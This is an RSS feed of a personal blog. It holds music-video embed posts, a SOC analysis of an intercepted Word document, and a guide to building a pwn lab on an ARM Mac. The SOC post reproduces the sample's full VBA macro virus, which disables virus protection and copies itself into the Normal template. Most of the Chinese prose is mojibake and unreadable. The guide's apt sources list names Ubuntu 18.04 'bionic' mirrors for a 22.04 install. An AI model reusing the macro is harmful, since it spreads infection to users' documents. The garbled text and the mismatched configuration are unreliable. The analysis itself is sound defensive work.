<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>SuMio</title><description>Cyber Bar</description><link>https://25pm-sumio.github.io/</link><language>en</language><item><title>HIMEHINA ç”°ä¸­å§¬é“ƒæœ¨é›</title><link>https://25pm-sumio.github.io/posts/2023/07/24/music/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2023/07/24/music/</guid><description>å…³æ³¨HIMEHINAå–µ, å…³æ³¨HIMEHINAè°¢è°¢å–µ</description><pubDate>Mon, 24 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;ã€WWWã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/mWPocET-tVM&quot; title=&quot;HIMEHINAã€WWWã€MV&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€æ„›åŒ…ãƒ€ãƒ³ã‚¹ãƒ›ãƒ¼ãƒ«ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/bnofYmfKLeo&quot; title=&quot;HIMEHINAã€æ„›åŒ…ãƒ€ãƒ³ã‚¹ãƒ›ãƒ¼ãƒ«ã€MV&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>III - å®é˜ãƒãƒªãƒ³ï¼†ã“ã¼ãƒ»ã‹ãªãˆã‚‹</title><link>https://25pm-sumio.github.io/posts/2024/05/03/music/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/05/03/music/</guid><pubDate>Fri, 03 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;ã€IIIã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/lUDPjyfmJrs&quot; title=&quot;ã€original anime MVã€‘IIIã€hololive/å®é˜ãƒãƒªãƒ³ï¼†ã“ã¼ãƒ»ã‹ãªãˆã‚‹ã€‘&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>Girls Band Cry</title><link>https://25pm-sumio.github.io/posts/2024/06/24/music/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/06/24/music/</guid><description>ä¸€äº›å–œæ¬¢çš„å“­æ³£å°‘å¥³ä¹é˜ŸMV</description><pubDate>Mon, 24 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;ã€Œé›‘è¸ã€åƒ•ã‚‰ã®è¡—ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/YDLafQ-Rg-k&quot; title=&quot;GIRLS BAND CRY - OPENINGï½œTOGENASHI TOGEARI &quot;Wrong World&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€Œç©ºã®ç®±ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/pA-pzhQQFBA?list=PL0o9aWyhb7ocxwDBYhzukikXmlB7SwXgm&quot; title=&quot;GIRLS BAND CRY - Inserted song from episode1 â€VOID&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€Œã‚µãƒ¨ãƒŠãƒ©ã‚µãƒ¨ãƒŠãƒ©ã‚µãƒ¨ãƒŠãƒ©ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/EuBGsmThfu0?list=PL0o9aWyhb7ocxwDBYhzukikXmlB7SwXgm&quot; title=&quot;ã€Official Music Videoã€‘TOGENASHI TOGEARI &quot;Underneath&quot; /Anime &quot;GIRLS BAND CRY&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€Œåã‚‚ãªãä½•ã‚‚ã‹ã‚‚ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/dDwN4MgcIlU?list=PL0o9aWyhb7ocxwDBYhzukikXmlB7SwXgm&quot; title=&quot;ã€Official Music Videoã€‘TOGENASHI TOGEARI &quot;Nameless Name&quot; /Anime &quot;GIRLS BAND CRY&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€Œçˆ†ãœã¦å’²ãã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/LU3f8ZGfd5g?list=PL0o9aWyhb7ocxwDBYhzukikXmlB7SwXgm&quot; title=&quot;ã€Official Music Videoã€‘TOGENASHI TOGEARI &quot;Bleeding Hearts&quot; /Anime &quot;GIRLS BAND CRY&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;ã€Œç©ºç™½ã¨ã‚«ã‚¿ãƒ«ã‚·ã‚¹ã€&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;821&quot; height=&quot;462&quot; src=&quot;https://www.youtube.com/embed/tr8psNtqYxg?list=PL0o9aWyhb7ocxwDBYhzukikXmlB7SwXgm&quot; title=&quot;GIRLS BAND CRY - Inserted song from episode11 &quot;Emptiness and Catharsis&quot;&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>æŸåŒºSOCæˆªè·å®ç—…æ¯’ä¼ªè£…å®šå‘æŠ•æ¯’æ ·æœ¬</title><link>https://25pm-sumio.github.io/posts/2024/06/29/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/06/29/01/</guid><description>å®¢æˆ·IPå› è®¿é—®ä¸šåŠ¡æ—¶å¤šæ‰“äº†å‡ ä¸ªæ ‡ç‚¹ï¼ŒWAFåˆ¤å®šä¸ºæ”»å‡»äº‹ä»¶è€Œè¢«banæ‰ï¼Œæ•…å‰å»è§£å°ï¼Œé¡ºä¾¿é€›ä¸€åœˆå…¶ä»–è®¾å¤‡ï¼›å‘ç°EDRæ‹¦æˆªäº†ä¸€ä¸ªwordæ–‡ä»¶ï¼Œæ•…SOCå¼€å§‹å¯¹å…¶è¿›è¡Œåˆ†æã€‚</description><pubDate>Sat, 29 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;äº‹ä»¶èµ·å› &lt;/h2&gt;
&lt;p&gt;å®¢æˆ·IPå› è®¿é—®ä¸šåŠ¡æ—¶å¤šæ‰“äº†å‡ ä¸ªæ ‡ç‚¹ï¼ŒWAFåˆ¤å®šä¸ºæ”»å‡»äº‹ä»¶è€Œè¢«banæ‰ï¼Œæ•…å‰å»è§£å°ï¼Œé¡ºä¾¿é€›ä¸€åœˆå…¶ä»–è®¾å¤‡ï¼›å‘ç°EDRæ‹¦æˆªäº†ä¸€ä¸ªwordæ–‡ä»¶ï¼Œæ•…SOCå¼€å§‹å¯¹å…¶è¿›è¡Œåˆ†æã€‚ï¼ˆps:ç»™åŒäº‹å‘ç—…æ¯’çš„æ—¶å€™ä¸€å®šè¦å°½å¿«å‘ŠçŸ¥è¯¦ç»†æ–°æƒ…å†µ....ï¼‰&lt;/p&gt;
&lt;h2&gt;è¿‡ç¨‹&lt;/h2&gt;
&lt;p&gt;æŸåŒºä¸‹å±SOCå¹³å°æ•è·åˆ°é’ˆå¯¹ç‰¹å®šå§”åŠå±€æŠ•æ¯’æ ·æœ¬ï¼Œå…¶å†…å®¹å¤§è‡´ä¸ºâ€œxxåŒºç¯xxxxå¤„ç½®æƒ…å†µâ€ï¼Œå…¶å‘ä»¶å•ä½ä¸ºâ€œxxå¸‚xxå±€xxåˆ†å±€â€ã€‚æ–‡ä»¶ä¸Šä¼ åè¢«EDRæ‹¦æˆªï¼ŒSOCå¯¹æ–‡ä»¶åˆ†æç ”åˆ¤ä¸ºå®æŠ•æ¯’ï¼Œå› å…¶ç–‘ä¼¼çœŸå®æ–‡ä»¶ç¯¡æ”¹å¹¶é’ˆå¯¹å•ç‹¬ç›®æ ‡æŠ•é€’ï¼Œæ•…æ€€ç–‘å…¶ä¸ºå®šå‘æŠ•æ¯’ã€‚ç”±äºè¯¥ä¸šåŠ¡ç¯å¢ƒä¸ºLinuxï¼Œæ— Microsoftï¼Œæ•…åˆ¤æ–­å¯¹ä¸šåŠ¡æ— å½±å“ï¼Œæš‚å®šæ— éœ€éš”ç¦»ã€‚&lt;/p&gt;
&lt;h2&gt;æ ·æœ¬åˆ†æ&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;æ²™ç®±åˆ†æ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;VTï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¾®æ­¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åˆå§‹æ ·æœ¬&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è§„åˆ™&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;th&gt;æº&lt;/th&gt;
&lt;th&gt;åˆ†æç¯å¢ƒ&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;Contains_VBA_macro_code&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Detect a MS Office document with embedded VBA macro code&lt;/td&gt;
&lt;td&gt;Github&lt;/td&gt;
&lt;td&gt;Win10(1903 64bit,Office2016)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;æ ¼å¼æ·±åº¦åˆ†æ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åµŒå…¥å®&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;è¡Œä¸ºç±»å‹&lt;/th&gt;
&lt;th&gt;å…³é”®å­—&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;AutoExec&lt;/td&gt;
&lt;td&gt;Document_Open&lt;/td&gt;
&lt;td&gt;Runs when the Word or Publisher document is opened&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Suspicious&lt;/td&gt;
&lt;td&gt;KILL&lt;/td&gt;
&lt;td&gt;May delete a file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Suspicious&lt;/td&gt;
&lt;td&gt;VBProject&lt;/td&gt;
&lt;td&gt;May attempt to modify the VBA code (self-modification)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Suspicious&lt;/td&gt;
&lt;td&gt;VBComponents&lt;/td&gt;
&lt;td&gt;May attempt to modify the VBA code (self-modification)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Suspicious&lt;/td&gt;
&lt;td&gt;CodeModule&lt;/td&gt;
&lt;td&gt;May attempt to modify the VBA code (self-modification)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Suspicious&lt;/td&gt;
&lt;td&gt;Base64 Strings&lt;/td&gt;
&lt;td&gt;Base64-encoded strings were detected, may be used to obfuscate strings (option --decode to see all)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å®ä»£ç &lt;/p&gt;
&lt;p&gt;&lt;code&gt;ThisDocument.cls&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&apos;APMP
&apos;KILL
Private Sub Document_Open()
   On Error Resume Next
   Application.DisplayStatusBar = False
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   MyCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
   Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
   If ThisDocument = NormalTemplate Then _
      Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
   With Host
       If .Lines(1, 1) = &quot;APMP&quot; &amp;amp; .Lines(1, 2) &amp;lt;&amp;gt; &quot;KILL&quot; Then
          .DeleteLines 1, .CountOfLines
          .InsertLines 1, MyCode
          If ThisDocument = NormalTemplate Then _
             ActiveDocument.SaveAs ActiveDocument.FullName
       End If
   End With
End Sub
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;è¿™ä¸ªå®åœ¨æ–‡æ¡£æ‰“å¼€æ—¶æ‰§è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Private Sub Document_Open()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­ä¾‹ç¨‹åŒ…å«è¯•å›¾é€šè¿‡éšè—çŠ¶æ€æ ã€å…³é—­ç—…æ¯’é˜²æŠ¤å’Œç¦ç”¨ä¿å­˜æç¤ºæ¥ç¦ç”¨å®‰å…¨åŠŸèƒ½çš„ä»£ç ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&apos;ç¦ç”¨é”™è¯¯æ¶ˆæ¯:
On Error Resume Next

&apos;éšè—çŠ¶æ€æ å’Œå…³é—­ç—…æ¯’ä¿æŠ¤:
Application.DisplayStatusBar = False	&apos;éšè—çŠ¶æ€æ ã€‚
Options.VirusProtection = False			&apos;å…³é—­ç—…æ¯’ä¿æŠ¤é€‰é¡¹ã€‚
Options.SaveNormalPrompt = False		&apos;å…³é—­ä¿å­˜ Normal æ¨¡æ¿æ—¶çš„æç¤ºã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è¯¥å®å°†å…¶è‡ªèº«ä»£ç çš„å‰ 20 è¡Œå¤åˆ¶åˆ°å˜é‡&lt;code&gt;MyCode&lt;/code&gt;ä¸­ã€‚ç„¶åï¼Œå®ƒå°è¯•è¯†åˆ«&lt;code&gt;Host&lt;/code&gt;æ–‡æ¡£ï¼Œè¯¥æ–‡æ¡£æ˜¯&lt;code&gt;Normal.dotm&lt;/code&gt;æ¨¡æ¿æˆ–å½“å‰æ´»åŠ¨æ–‡æ¡£ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MyCode = ThisDocument.VBProject.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
   Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
   If ThisDocument = NormalTemplate Then _
      Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä»£ç æ£€æŸ¥Hostæ–‡æ¡£ä»£ç æ¨¡å—å‰ä¸¤è¡Œä¸­çš„ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆ&lt;code&gt;APMP&lt;/code&gt;å’Œ&lt;code&gt;KILL&lt;/code&gt;ï¼‰ã€‚å¦‚æœ&lt;code&gt;APMP&lt;/code&gt;å­˜åœ¨è€Œ&lt;code&gt;KILL&lt;/code&gt;ä¸å­˜åœ¨ï¼Œåˆ™å®å°†åˆ é™¤&lt;code&gt;Host&lt;/code&gt;æ–‡æ¡£çš„å…¨éƒ¨å†…å®¹ï¼Œå¹¶æ’å…¥&lt;code&gt;MyCode&lt;/code&gt;çš„å†…å®¹ã€‚å®é™…ä¸Šæ˜¯ç”¨å…¶è‡ªèº«æ›¿æ¢ä¸»æœºå®ã€‚å¦‚æœæ„ŸæŸ“ç›®æ ‡æ˜¯ Normal æ¨¡æ¿ï¼Œåˆ™å®ƒä¼šå¼ºåˆ¶ä¿å­˜æ´»åŠ¨æ–‡æ¡£ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   With Host
       If .Lines(1, 1) = &quot;APMP&quot; &amp;amp; .Lines(1, 2) &amp;lt;&amp;gt; &quot;KILL&quot; Then
          .DeleteLines 1, .CountOfLines
          .InsertLines 1, MyCode
          If ThisDocument = NormalTemplate Then _
             ActiveDocument.SaveAs ActiveDocument.FullName
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;è¡Œä¸ºåˆ†æ&lt;/h2&gt;
&lt;p&gt;å€Ÿç”¨éƒ¨é—¨è€å¤§çš„åˆ†æç»“æœï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ç”±æ ·æœ¬ä»£ç åˆ†æå¯å¾—çŸ¥å…¶ç›®çš„ä¸ºè¿­ä»£æ›´æ–°ç›®æ ‡ä¸»æœºä¸Šå·²ç»è¢«æ±¡æŸ“è¿‡çš„æ¨¡æ¿ï¼Œç»å¯¹æ¯”å‘ç°ç±»ä¼¼ç›¸åŒVBAè„šæœ¬æŠ•æ¯’æœ€æ—©å‡ºç°æ—¶é—´2014-2015å¹´ä¹‹é—´ï¼Œç›®æ ‡çš†ä¸ºå¢ƒå†…ï¼Œå› ä¸»è¦ä¸ºä»£ç è¿­ä»£è¡Œä¸ºå¹¶æ²¡æœ‰å‡ºç°å¤–è”ï¼Œåˆå› å…¶ä¼šå¯¹å…¬ç”¨æ¨¡æ¿ä¸­çš„APMPä»¥åŠKILLåšç›‘æµ‹å¹¶åšå‡ºè¿­ä»£è¡Œä¸ºï¼ŒåŒæ—¶å…¶å­˜åœ¨å®šå‘é’“é±¼ç‰¹å¾ï¼Œæ‰€ä»¥æ–­å®šå…¶åœ¨ç‰¹å®šæƒ…å†µä¸‹è¿›è¡Œå¿«é€Ÿä¼ æ’­è¿­ä»£åï¼Œé…åˆå…¶ä»–æ”»å‡»å¯¹è¡Œä¸šè¿›è¡Œæ‰“å‡»çš„å¯èƒ½æ€§è¾ƒé«˜,æ•…æ€€ç–‘ä¸ºæŸç»„ç»‡ä¸‹å±è¡Œä¸šæ€§åƒµå°¸ç½‘ç»œã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;&lt;/h1&gt;
</content:encoded></item><item><title>MacOS Mç³»åˆ—èŠ¯ç‰‡åˆ©ç”¨UTMè™šæ‹Ÿæœºå®‰è£…Ubuntu x86_64æ­å»ºPWNç¯å¢ƒ</title><link>https://25pm-sumio.github.io/posts/2024/07/26/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/07/26/01/</guid><description>è¿‘æœŸåœ¨å­¦ä¹ pwnçš„è¿‡ç¨‹ä¸­è€ƒè™‘åˆ°éƒ¨åˆ†CTFæ¯”èµ›ç¦æ­¢æ¥å…¥äº’è”ç½‘ï¼Œäºæ˜¯å¼€å§‹å°è¯•åœ¨ARMæ¶æ„çš„Macä¸ŠæŠ˜è…¾...</description><pubDate>Fri, 26 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;æ­¤æ¬¡é‡‡ç”¨åœ¨UTMè™šæ‹Ÿæœºè½¯ä»¶å†…ï¼Œé€šè¿‡QEMUå¼•æ“æ¨¡æ‹Ÿx86æ¶æ„ï¼Œä»è€Œå®ç°åˆ›å»ºx86æ¶æ„çš„è™šæ‹Ÿæœºã€‚å¹³æ—¥é‡Œä½¿ç”¨æ„Ÿæœ€å¥½çš„æ–¹æ³•è‡ªç„¶æ˜¯VPSæˆ–è€…è‡ªå¤‡ä¸€å°winç‰©ç†æœºï¼Œä½†æ˜¯è€ƒè™‘åˆ°éƒ¨åˆ†ç‰¹æ®Šæƒ…å†µæˆ–æ¯”èµ›ä¸­ä¸å…è®¸è¿æ¥äº’è”ç½‘ï¼Œåˆå«Œå¸¦ä¸¤å°ç”µè„‘ä¸å¤Ÿä¼˜é›…ï¼Œæ‰€ä»¥å°è¯•ç”¨å°½å¯ä»¥ç®€å•ä¸”ç¨³å®šçš„æ–¹æ³•åœ¨ARMæ¶æ„çš„macä¸Šæ­å»ºx86çš„pwnç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;:::warning
æ­¤æ–¹æ³•å¯¹è™šæœºæ€§èƒ½å½±å“è¾ƒå¤§ï¼ŒDesktopç‰ˆå‡ ä¹æ˜¯å¡åˆ°æ²¡æ³•ç”¨ï¼Œå„ä½å¸ˆå‚…è‡ªè¡Œæ–Ÿé…Œã€‚
:::&lt;/p&gt;
&lt;h2&gt;å‚è€ƒé…ç½®&lt;/h2&gt;
&lt;p&gt;M2 MacBookAir 16Gå†…å­˜1Tç¡¬ç›˜&lt;/p&gt;
&lt;p&gt;macOS Sonoma -- 14.5&lt;/p&gt;
&lt;p&gt;UTM -- 4.5.3 (99)&lt;/p&gt;
&lt;p&gt;Image -- Ubuntu Server 22.04 LTS x86_64&lt;/p&gt;
&lt;p&gt;:::tip
é•œåƒå»ºè®®é€‰æ‹©22.04ï¼Œæœ€æ–°çš„24.04ç»æµ‹è¯•æœ‰äº›å°é—®é¢˜
:::&lt;/p&gt;
&lt;h2&gt;å®‰è£…UTM&lt;/h2&gt;
&lt;p&gt;ç›´æ¥Githubä¸‹è½½&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/utmapp/UTM/releases
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;App Storeä¹Ÿæœ‰ï¼Œæƒ³æ”¯æŒå¼€å‘è€…å¯ä»¥å»è´­ä¹°ï¼ŒåŠŸèƒ½å®Œå…¨ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…ç›´æ¥æ‹–æ‹½å°±å¥½&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/02fdf0eb3e9ebadf63.png&quot; alt=&quot;02&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;å®‰è£… Ubuntu 22.04 x86_64&lt;/h2&gt;
&lt;p&gt;ç›´æ¥å®˜ç½‘ä¸‹è½½&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://ubuntu.com/download/server
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾€ä¸‹ç¿»æ‰¾åˆ°å…ˆå‰ç‰ˆæœ¬ï¼Œé€‰æ‹© Download 22.04 LTS&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/0303a9693220f40164.png&quot; alt=&quot;03&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;ç³»ç»Ÿå®‰è£…&lt;/h2&gt;
&lt;p&gt;æ–°å»ºè™šæ‹Ÿæœºï¼Œé€‰æ‹©æ¨¡æ‹Ÿã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/043adb8b85c4875a3d.png&quot; alt=&quot;04&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©Linux&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/05481d3ab04c0a64d4.png&quot; alt=&quot;05&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©å·²ç»ä¸‹è½½å¥½çš„é•œåƒæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/066b2e2cf9bf171638.png&quot; alt=&quot;06&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é»˜è®¤é€‰é¡¹å°±æ˜¯x86_64ï¼Œç›´æ¥ä¸‹ä¸€æ­¥ã€‚ç¡¬ç›˜å¤§å°ã€å…±äº«ç›®å½•æŒ‰éœ€æ±‚è‡ªè¡Œé…ç½®ï¼Œæˆ‘ä¹ æƒ¯ç›´æ¥ä½¿ç”¨ FinalShell ï¼Œæ•…ä¸åšé…ç½®ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/070fc9ffcb6e8ac3ce.png&quot; alt=&quot;07&quot; /&gt;&lt;/p&gt;
&lt;p&gt;èµ·ä¸€ä¸ªåå­—ï¼Œç¡¬ä»¶é…ç½®å°±é€‰å®Œäº†&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.picgo.net/2024/08/08/08c508573facf96a18.png&quot; alt=&quot;08&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¼€æœºåæ ¹æ®æç¤ºå®‰è£…ç³»ç»Ÿï¼Œç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šè¿™é‡Œå°±ä¸å†é‡å¤ã€‚&lt;/p&gt;
&lt;h2&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;
&lt;p&gt;ç»å†äº†å®‰è£…ç³»ç»Ÿè¿‡ç¨‹çš„å„ä½æƒ³å¿…å·²ç»ä½“ä¼šåˆ°äº†è¯¥è½¯ä»¶å¯¹äºè™šæ‹Ÿæœºçš„æ€§èƒ½æŸå¤±æœ‰å¤šä¹ˆä¸¥é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯é€šè¿‡SSHè¿æ¥è¿™å°æœºå™¨ã€‚&lt;/p&gt;
&lt;h3&gt;æ¢æº&lt;/h3&gt;
&lt;p&gt;:::note&lt;/p&gt;
&lt;p&gt;æˆ‘è‡ªå·±æ˜¯æ²¡æœ‰æ¢æºçš„ï¼Œç³»ç»Ÿé»˜è®¤é€‰æ‹©äº†æ¸…åæºã€‚å¦‚æœéœ€è¦æ¢æºå¯æŒ‰ä»¥ä¸‹æ­¥éª¤è‡ªè¡Œæ›´æ¢ï¼Œæ— éœ€æ¢æºå¯ç›´æ¥è·³è¿‡æ­¤æ­¥éª¤ã€‚&lt;/p&gt;
&lt;p&gt;:::&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nano /etc/apt/sources.list
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Control + O ï¼Œå›è½¦ä¿å­˜ï¼ŒControl + X é€€å‡º&lt;/p&gt;
&lt;h3&gt;å®‰è£…openssh&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sudo apt update
sudo apt install openssh-server
sudo apt install net-tools vim
&lt;/code&gt;&lt;/pre&gt;
